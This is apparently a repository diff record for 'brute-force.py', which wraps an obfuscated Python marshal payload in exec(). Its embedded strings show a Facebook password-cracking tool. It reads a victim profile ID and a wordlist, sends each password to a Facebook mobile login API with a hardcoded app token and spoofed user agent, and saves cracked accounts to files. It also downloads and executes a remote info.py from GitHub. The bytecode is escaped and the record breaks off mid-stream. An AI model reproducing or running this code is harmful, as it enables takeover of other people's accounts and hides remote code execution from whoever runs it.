\\x00t\\n\\x00d\\x05\\x00\\x83\\x01\\x00}\\x02\\x00|\\x02\\x00j\\x0b\\x00|\\x01\\x00t\\x06\\x00\\x83\\x02\\x00\\x01Wn\\x07\\x00\\x01\\x01\\x01n\\x01\\x00Xd\\x00\\x00S(\\x06\\x00\\x00\\x00Nt\\x04\\x00\\x00\\x00saveR\\x14\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Exitc\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x03\\x00\\x00\\x00S\\x00\\x00\\x00s\\xfe\\x00\\x00\\x00|\\x00\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00t\\x02\\x00\\x17d\\x02\\x00\\x17|\\x01\\x00\\x17d\\x03\\x00\\x17\\x83\\x01\\x00}\\x02\\x00t\\x03\\x00j\\x04\\x00|\\x02\\x00\\x83\\x01\\x00}\\x03\\x00d\\x04\\x00|\\x03\\x00k\\x06\\x00r\\x93\\x00t\\x05\\x00t\\x06\\x00d\\x05\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x08\\x00d\\t\\x00\\x83\\x02\\x00}\\x04\\x00|\\x04\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x04\\x00j\\x08\\x00\\x83\\x00\\x00\\x01ng\\x00d\\x0b\\x00|\\x03\\x00d\\x0c\\x00\\x19k\\x06\\x00r\\xfa\\x00t\\x05\\x00t\\t\\x00d\\r\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17t\\t\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x0e\\x00d\\t\\x00\\x83\\x02\\x00}\\x05\\x00|\\x05\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x05\\x00j\\x08\\x00\\x83\\x00\\x00\\x01n\\x00\\x00d\\x00\\x00S(\\x0f\\x00\\x00\\x00Ns\\x91\\x00\\x00\\x00https:\/\/b-api.facebook.com\/method\/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s\\x17\\x00\\x00\\x00&locale=en_US&password=sH\\x00\\x00\\x00&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt\\x0c\\x00\\x00\\x00access_tokens\\x0b\\x00\\x00\\x00\\n[NOOB_OK] s\\x05\\x00\\x00\\x00  |  s\\x01\\x00\\x00\\x00\\ns\\x18\\x00\\x00\\x00save\/Noob_Successful.txtt\\x01\\x00\\x00\\x00as\\n\\x00\\x00\\x00 [ NOOB ] s\\x10\\x00\\x00\\x00www.facebook.comt\\t\\x00\\x00\\x00error_msgs\\x0b\\x00\\x00\\x00\\n[NOOB_CP] s\\x18\\x00\\x00\\x00save\/Noob_CheckPoint.txt(\\n\\x00\\x00\\x00t\\x02\\x00\\x00\\x00brt\\x04\\x00\\x00\\x00opent\\x06\\x00\\x00\\x00victimt\\x04\\x00\\x00\\x00jsont\\x04\\x00\\x00\\x00loadR\\x0b\\x00\\x00\\x00R\\x11\\x00\\x00\\x00R\\x04\\x00\\x00\\x00t\\x05\\x00\\x00\\x00closeR\\x12\\x00\\x00\\x00(\\x06\\x00\\x00\\x00R\\x08\\x00\\x00\\x00t\\x04\\x00\\x00\\x00linet\\x04\\x00\\x00\\x00datat\\x01\\x00\\x00\\x00qt\\x03\\x00\\x00\\x00okbt\\x03\\x00\\x00\\x00cps(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00main\\x89\\x00\\x00\\x00s\\x1a\\x00\\x00\\x00\\x00\\x01\\x06\\x02\\x1f\\x01\\x0f\\x02\\x0c\\x01\\x1e\\x01\\x0f\\x01\\x19\\x01\\r\\x02\\x10\\x01\"\\x01\\x0f\\x01\\x19\\x01i\\x1e\\x00\\x00\\x00(\\x0c\\x00\\x00\\x00t\\x02\\x00\\x00\\x00ost\\x05\\x00\\x00\\x00mkdirt\\x07\\x00\\x00\\x00OSErrorR\\x1b\\x00\\x00\\x00t\\x03\\x00\\x00\\x00filt\\t\\x00\\x00\\x00readlinest\\x02\\x00\\x00\\x00idt\\x06\\x00\\x00\\x00appendt\\x05\\x00\\x00\\x00stript\\x04\\x00\\x00\\x00exitR\\x00\\x00\\x00\\x00t\\x03\\x00\\x00\\x00map(\\x03\\x00\\x00\\x00R\\t\\x00\\x00\\x00R%\\x00\\x00\\x00t\\x01\\x00\\x00\\x00p(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Noob~\\x00\\x00\\x00s\\x1e\\x00\\x00\\x00\\x00\\x01\\x03\\x01\\x11\\x01\\r\\x01\\x04\\x01\\x03\\x01\\x1c\\x01\\x1b\\x01\\x03\\x01\\x0e\\x02\\t\\x13\\x03\\x01\\x0c\\x01\\x14\\x01\\x03\\x01(\\x02\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;](<\\x00\\x00\\x00R&\\x00\\x00\\x00R\\x02\\x00\\x00\\x00R\\x06\\x00\\x00\\x00t\\x06\\x00\\x00\\x00randomR\\x1d\\x00\\x00\\x00t\\x08\\x00\\x00\\x00requestst\\x0b\\x00\\x00\\x00ImportErrort\\x06\\x00\\x00\\x00systemt\\t\\x00\\x00\\x00mechanizet\\x14\\x00\\x00\\x00multiprocessing.poolR\\x00\\x00\\x00\\x00R\\x01\\x00\\x00\\x00R\\x0b\\x00\\x00\\x00R\\x1a\\x00\\x00\\x00t\\x11\\x00\\x00\\x00set_handle_robotst\\x05\\x00\\x00\\x00Falset\\x12\\x00\\x00\\x00set_handle_refresht\\x05\\x00\\x00\\x00_httpt\\x14\\x00\\x00\\x00HTTPRefreshProcessort\\n\\x00\\x00\\x00addheadersR\\x07\\x00\\x00\\x00t\\x07\\x00\\x00\\x00sessiont\\x02\\x00\\x00\\x00rst\\x03\\x00\\x00\\x00gett\\x02\\x00\\x00\\x00rgt\\x04\\x00\\x00\\x00textt\\x01\\x00\\x00\\x00xR+\\x00\\x00\\x00t\\x03\\x00\\x00\\x00aclR\\x0f\\x00\\x00\\x00R\\x10\\x00\\x00\\x00R\\x12\\x00\\x00\\x00R\\x0e\\x00\\x00\\x00t\\x03\\x00\\x00\\x00pclR\\x11\\x00\\x00\\x00t\\x03\\x00\\x00\\x00wclt\\x03\\x00\\x00\\x00mclt\\x03\\x00\\x00\\x00nclt\\x06\\x00\\x00\\x00formatt\\x04\\x00\\x00\\x00warnt\\x04\\x00\\x00\\x00infot\\n\\x00\\x00\\x00PermissionR.\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Truet\\t\\x00\\x00\\x00raw_inputt\\x03\\x00\\x00\\x00Usrt\\x04\\x00\\x00\\x00Usert\\x03\\x00\\x00\\x00psdt\\x03\\x00\\x00\\x00Pwdt\\x04\\x00\\x00\\x00logoR\\x1c\\x00\\x00\\x00t\\x08\\x00\\x00\\x00passlistR)\\x00\\x00\\x00t\\x03\\x00\\x00\\x00strR\\x1b\\x00\\x00\\x00R*\\x00\\x00\\x00t\\x04\\x00\\x00\\x00wordt\\x04\\x00\\x00\\x00filet\\x03\\x00\\x00\\x00lenR1\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x05\\x00\\x00\\x00s\\xa0\\x00\\x00\\x00<\\x02\\x03\\x01\\x10\\x01\\r\\x01\\x11\\x01\\r\\x02\\x03\\x01\\x10\\x01\\r\\x01\\r\\x01\\x10\\x02\\x10\\x01\\x10\\x02\\t\\x07\\x0c\\x01\\r\\x01\\x1c\\x01\\x0c\\x03\\r\\x02\\n\\x01\\r\\x01\\r\\x01\\x0c\\x01\\t\\x01\\x0f\\x01\\x08\\x06\\x06\\x04\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x07*\\x04$\\x02\\x0c\\x01\\x03\\x02\\x0e\\x01\\r\\x01\\r\\x01\\x07\\x02\\t\\x01\\r\\x01\\n\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x04\\x02\\x0e\\x01\\x10\\x02\\x0e\\x01\\x11\\x02\\r\\x01\\x05\\x01\\n\\x01\\x10\\x01\\x10\\x01\\x06\\x01\\x18\\x01\\x15\\x02\\x12\\x01\\x12\\x01\\x1e\\x06\\t%(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02'))\n","files":{"\/brute-force.py":{"changes":[{"diff":"\n import marshal\n-#https:\/\/youtube.com\/NjankSoekamti\n-exec(marshal.loads('c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x0e\\x15\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x80\\x14\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00@\\x00\\x00\\x00s\\xfc\\x03\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x01\\x00Z\\x01\\x00d\\x00\\x00d\\x01\\x00l\\x02\\x00Z\\x02\\x00d\\x00\\x00d\\x01\\x00l\\x03\\x00Z\\x03\\x00d\\x00\\x00d\\x01\\x00l\\x04\\x00Z\\x04\\x00y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x05\\x00Z\\x05\\x00Wn\\x1e\\x00\\x04e\\x06\\x00k\\n\\x00rl\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x02\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xe\\x00\\x00j\\x07\\x00d\\x03\\x00\\x83\\x01\\x00\\x01y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00Wn*\\x00\\x04e\\x06\\x00k\\n\\x00r\\xb6\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x04\\x00\\x83\\x01\\x00\\x01d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00n\\x01\\x00Xd\\x00\\x00d\\x05\\x00l\\t\\x00m\\n\\x00Z\\n\\x00\\x01d\\x00\\x00d\\x06\\x00l\\x08\\x00m\\x0b\\x00Z\\x0b\\x00\\x01d\\x07\\x00\\x84\\x00\\x00Z\\x0c\\x00e\\x08\\x00j\\x0b\\x00\\x83\\x00\\x00Z\\r\\x00e\\r\\x00j\\x0e\\x00e\\x0f\\x00\\x83\\x01\\x00\\x01e\\r\\x00j\\x10\\x00e\\x08\\x00j\\x11\\x00j\\x12\\x00\\x83\\x00\\x00d\\x08\\x00d\\t\\x00\\x83\\x01\\x01\\x01d2\\x00g\\x01\\x00e\\r\\x00_\\x13\\x00e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00d\\r\\x00\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d\\x0e\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x05\\x00j\\x15\\x00\\x83\\x00\\x00Z\\x16\\x00e\\x16\\x00j\\x17\\x00Z\\x18\\x00e\\x18\\x00d\\x0f\\x00\\x83\\x01\\x00j\\x19\\x00Z\\x1a\\x00e\\x1a\\x00d\\x01\\x00\\x04Ug\\x00\\x00Z\\x1b\\x00d\\x10\\x00Z\\x1c\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x1a\\x00j&\\x00d\\x1b\\x00e \\x00d\\x1c\\x00e\\x1d\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00d\\x1f\\x00e\\x1f\\x00\\x83\\x00\\x05Z\\'\\x00d \\x00j&\\x00d\\x1c\\x00e\\x1d\\x00d\\x1f\\x00e\\x1f\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00\\x83\\x00\\x04Z(\\x00e)\\x00d!\\x00k\\x02\\x00rS\\x02n\/\\x00e\\x0c\\x00e\"\\x00d\"\\x00\\x17\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d#\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d$\\x00\\x83\\x01\\x00\\x01e*\\x00\\x83\\x00\\x00\\x01x\\xb2\\x00e+\\x00r6\\x03e\\x00\\x00j\\x07\\x00d%\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00e\\'\\x00\\x83\\x01\\x00\\x01e,\\x00e \\x00d&\\x00\\x17\\x83\\x01\\x00Z-\\x00e-\\x00e.\\x00k\\x02\\x00r\\x18\\x03e\\x0c\\x00e\\x1e\\x00d\\'\\x00\\x17\\x83\\x01\\x00\\x01e,\\x00e\\x1f\\x00d(\\x00\\x17\\x83\\x01\\x00Z\/\\x00e\/\\x00e0\\x00k\\x02\\x00r\\xfa\\x02e\\x0c\\x00e\\x1e\\x00d)\\x00\\x17\\x83\\x01\\x00\\x01Pq3\\x03e\\x0c\\x00e\\x1d\\x00d*\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02e\\x0c\\x00e\\x1d\\x00d+\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02We\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e1\\x00GHe\\x0c\\x00e(\\x00\\x83\\x01\\x00\\x01e,\\x00e\"\\x00d,\\x00\\x17\\x83\\x01\\x00Z2\\x00e,\\x00e \\x00d-\\x00\\x17\\x83\\x01\\x00Z3\\x00e3\\x00Z4\\x00e\\x0c\\x00e\\x1e\\x00d.\\x00\\x17e5\\x00e4\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01e6\\x00e3\\x00d\/\\x00\\x83\\x02\\x00j7\\x00\\x83\\x00\\x00Z8\\x00e6\\x00e4\\x00d\/\\x00\\x83\\x02\\x00\\x8f1\\x00Z9\\x00e:\\x00e9\\x00j7\\x00\\x83\\x00\\x00\\x83\\x01\\x00Z\\x1a\\x00e\\x0c\\x00e\\x1d\\x00d0\\x00\\x17e5\\x00e\\x1a\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01Wd\\x01\\x00QXd1\\x00\\x84\\x00\\x00Z;\\x00e;\\x00\\x83\\x00\\x00\\x01d\\x01\\x00S(3\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x15\\x00\\x00\\x00pip2 install requestss\\x15\\x00\\x00\\x00pkg install figlet -ys\\x16\\x00\\x00\\x00pip2 install mechanize(\\x01\\x00\\x00\\x00t\\n\\x00\\x00\\x00ThreadPool(\\x01\\x00\\x00\\x00t\\x07\\x00\\x00\\x00Browserc\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00C\\x00\\x00\\x00s?\\x00\\x00\\x00x8\\x00|\\x00\\x00D]0\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00j\\x02\\x00|\\x01\\x00\\x83\\x01\\x00\\x01t\\x00\\x00j\\x01\\x00j\\x03\\x00\\x83\\x00\\x00\\x01t\\x04\\x00j\\x05\\x00d\\x01\\x00\\x83\\x01\\x00\\x01q\\x07\\x00Wd\\x00\\x00S(\\x02\\x00\\x00\\x00Ng\\x9a\\x99\\x99\\x99\\x99\\x99\\xa9?(\\x06\\x00\\x00\\x00t\\x03\\x00\\x00\\x00syst\\x06\\x00\\x00\\x00stdoutt\\x05\\x00\\x00\\x00writet\\x05\\x00\\x00\\x00flusht\\x04\\x00\\x00\\x00timet\\x05\\x00\\x00\\x00sleep(\\x02\\x00\\x00\\x00t\\x03\\x00\\x00\\x00argt\\x01\\x00\\x00\\x00i(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x06\\x00\\x00\\x00motion\\x16\\x00\\x00\\x00s\\x08\\x00\\x00\\x00\\x00\\x01\\r\\x01\\x10\\x01\\r\\x01t\\x08\\x00\\x00\\x00max_timei\\x01\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;]t\\x05\\x00\\x00\\x00clears&\\x00\\x00\\x00\\x1b[1;33m\\nEverything is getting ready...i\\x03\\x00\\x00\\x00sJ\\x00\\x00\\x00https:\/\/raw.githubusercontent.com\/Noob-Hacker71\/Noob-Hacker71\/main\/info.pys\\x07\\x00\\x00\\x00\\x1b[1;30ms\\x07\\x00\\x00\\x00\\x1b[1;31ms\\x07\\x00\\x00\\x00\\x1b[1;32ms\\x07\\x00\\x00\\x00\\x1b[1;33ms\\x07\\x00\\x00\\x00\\x1b[1;34ms\\x07\\x00\\x00\\x00\\x1b[1;35ms\\x07\\x00\\x00\\x00\\x1b[1;36ms\\x07\\x00\\x00\\x00\\x1b[1;37ms\\x07\\x00\\x00\\x00\\x1b[1;94ms\\x07\\x00\\x00\\x00\\x1b[0;00ms\\xed\\x00\\x00\\x00\\n{ycl}[+] Attacking In Background For Fast Cracking ...\\n{bcl}[+] This A Facebook Password Cracker Script ...\\n{gcl}[+] Attack With Your Custom Wordlist ...\\n{rcl}[+] This Script From Noob-Hacker71 ...\\n{ccl}[+] Use It At Your Own Risk ...\\n\\nt\\x03\\x00\\x00\\x00bclt\\x03\\x00\\x00\\x00rclt\\x03\\x00\\x00\\x00gclt\\x03\\x00\\x00\\x00cclt\\x03\\x00\\x00\\x00ycls\\xd7\\x00\\x00\\x00{rcl}[+] {ycl}Connect A Fast Network For Better Experience..\\n{rcl}[+] {rcl}Don\\'t Use It For Any Illigele Puspose...\\n{rcl}[+] {gcl}For Stop Attack Press CTRL + \\\\ ...\\n--------------------------------------------------t\\x02\\x00\\x00\\x00Ons#\\x00\\x00\\x00You Need Noob-Hacker71\\'s Permissioni\\x02\\x00\\x00\\x00s\/\\x00\\x00\\x00xdg-open https:\/\/www.facebook.com\/ntahsan.nayems\\x1b\\x00\\x00\\x00figlet -f small Brute-Forces\\x13\\x00\\x00\\x00Enter Username =>> s\\x0e\\x00\\x00\\x00\\nCorrect User\\ns\\x13\\x00\\x00\\x00Enter Password =>> s\\x17\\x00\\x00\\x00\\nSuccessfully Logged Ins\\x0f\\x00\\x00\\x00\\nWrong Passwords\\x18\\x00\\x00\\x00\\nWrong User,,,Try Again\\ns\\x1c\\x00\\x00\\x00\\nEnter Victim Profile ID >> s\\x11\\x00\\x00\\x00Wordlist Path >> s\\x0e\\x00\\x00\\x00\\nWordlist =>> t\\x01\\x00\\x00\\x00rs\\x14\\x00\\x00\\x00\\nTotal Password =>> c\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x05\\x00\\x00\\x00C\\x00\\x00\\x00s\\xa7\\x00\\x00\\x00y\\x11\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00\\x83\\x01\\x00\\x01Wn\\x11\\x00\\x04t\\x02\\x00k\\n\\x00r$\\x00\\x01\\x01\\x01n\\x01\\x00Xy7\\x00x0\\x00t\\x03\\x00t\\x04\\x00d\\x02\\x00\\x83\\x02\\x00j\\x05\\x00\\x83\\x00\\x00D]\\x19\\x00}\\x00\\x00t\\x06\\x00j\\x07\\x00|\\x00\\x00j\\x08\\x00\\x83\\x00\\x00\\x83\\x01\\x00\\x01q>\\x00WWn\\x11\\x00\\x01\\x01\\x01t\\t\\x00d\\x03\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xd\\x04\\x00\\x84\\x00\\x00}\\x01\\x00y \\x00t\\n\\x00d\\x05\\x00\\x83\\x01\\x00}\\x02\\x00|\\x02\\x00j\\x0b\\x00|\\x01\\x00t\\x06\\x00\\x83\\x02\\x00\\x01Wn\\x07\\x00\\x01\\x01\\x01n\\x01\\x00Xd\\x00\\x00S(\\x06\\x00\\x00\\x00Nt\\x04\\x00\\x00\\x00saveR\\x14\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Exitc\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x03\\x00\\x00\\x00S\\x00\\x00\\x00s\\xfe\\x00\\x00\\x00|\\x00\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00t\\x02\\x00\\x17d\\x02\\x00\\x17|\\x01\\x00\\x17d\\x03\\x00\\x17\\x83\\x01\\x00}\\x02\\x00t\\x03\\x00j\\x04\\x00|\\x02\\x00\\x83\\x01\\x00}\\x03\\x00d\\x04\\x00|\\x03\\x00k\\x06\\x00r\\x93\\x00t\\x05\\x00t\\x06\\x00d\\x05\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x08\\x00d\\t\\x00\\x83\\x02\\x00}\\x04\\x00|\\x04\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x04\\x00j\\x08\\x00\\x83\\x00\\x00\\x01ng\\x00d\\x0b\\x00|\\x03\\x00d\\x0c\\x00\\x19k\\x06\\x00r\\xfa\\x00t\\x05\\x00t\\t\\x00d\\r\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17t\\t\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x0e\\x00d\\t\\x00\\x83\\x02\\x00}\\x05\\x00|\\x05\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x05\\x00j\\x08\\x00\\x83\\x00\\x00\\x01n\\x00\\x00d\\x00\\x00S(\\x0f\\x00\\x00\\x00Ns\\x91\\x00\\x00\\x00https:\/\/b-api.facebook.com\/method\/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s\\x17\\x00\\x00\\x00&locale=en_US&password=sH\\x00\\x00\\x00&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt\\x0c\\x00\\x00\\x00access_tokens\\x0b\\x00\\x00\\x00\\n[NOOB_OK] s\\x05\\x00\\x00\\x00  |  s\\x01\\x00\\x00\\x00\\ns\\x18\\x00\\x00\\x00save\/Noob_Successful.txtt\\x01\\x00\\x00\\x00as\\n\\x00\\x00\\x00 [ NOOB ] s\\x10\\x00\\x00\\x00www.facebook.comt\\t\\x00\\x00\\x00error_msgs\\x0b\\x00\\x00\\x00\\n[NOOB_CP] s\\x18\\x00\\x00\\x00save\/Noob_CheckPoint.txt(\\n\\x00\\x00\\x00t\\x02\\x00\\x00\\x00brt\\x04\\x00\\x00\\x00opent\\x06\\x00\\x00\\x00victimt\\x04\\x00\\x00\\x00jsont\\x04\\x00\\x00\\x00loadR\\x0b\\x00\\x00\\x00R\\x11\\x00\\x00\\x00R\\x04\\x00\\x00\\x00t\\x05\\x00\\x00\\x00closeR\\x12\\x00\\x00\\x00(\\x06\\x00\\x00\\x00R\\x08\\x00\\x00\\x00t\\x04\\x00\\x00\\x00linet\\x04\\x00\\x00\\x00datat\\x01\\x00\\x00\\x00qt\\x03\\x00\\x00\\x00okbt\\x03\\x00\\x00\\x00cps(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00main\\x89\\x00\\x00\\x00s\\x1a\\x00\\x00\\x00\\x00\\x01\\x06\\x02\\x1f\\x01\\x0f\\x02\\x0c\\x01\\x1e\\x01\\x0f\\x01\\x19\\x01\\r\\x02\\x10\\x01\"\\x01\\x0f\\x01\\x19\\x01i\\x1e\\x00\\x00\\x00(\\x0c\\x00\\x00\\x00t\\x02\\x00\\x00\\x00ost\\x05\\x00\\x00\\x00mkdirt\\x07\\x00\\x00\\x00OSErrorR\\x1b\\x00\\x00\\x00t\\x03\\x00\\x00\\x00filt\\t\\x00\\x00\\x00readlinest\\x02\\x00\\x00\\x00idt\\x06\\x00\\x00\\x00appendt\\x05\\x00\\x00\\x00stript\\x04\\x00\\x00\\x00exitR\\x00\\x00\\x00\\x00t\\x03\\x00\\x00\\x00map(\\x03\\x00\\x00\\x00R\\t\\x00\\x00\\x00R%\\x00\\x00\\x00t\\x01\\x00\\x00\\x00p(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Noob~\\x00\\x00\\x00s\\x1e\\x00\\x00\\x00\\x00\\x01\\x03\\x01\\x11\\x01\\r\\x01\\x04\\x01\\x03\\x01\\x1c\\x01\\x1b\\x01\\x03\\x01\\x0e\\x02\\t\\x13\\x03\\x01\\x0c\\x01\\x14\\x01\\x03\\x01(\\x02\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;](<\\x00\\x00\\x00R&\\x00\\x00\\x00R\\x02\\x00\\x00\\x00R\\x06\\x00\\x00\\x00t\\x06\\x00\\x00\\x00randomR\\x1d\\x00\\x00\\x00t\\x08\\x00\\x00\\x00requestst\\x0b\\x00\\x00\\x00ImportErrort\\x06\\x00\\x00\\x00systemt\\t\\x00\\x00\\x00mechanizet\\x14\\x00\\x00\\x00multiprocessing.poolR\\x00\\x00\\x00\\x00R\\x01\\x00\\x00\\x00R\\x0b\\x00\\x00\\x00R\\x1a\\x00\\x00\\x00t\\x11\\x00\\x00\\x00set_handle_robotst\\x05\\x00\\x00\\x00Falset\\x12\\x00\\x00\\x00set_handle_refresht\\x05\\x00\\x00\\x00_httpt\\x14\\x00\\x00\\x0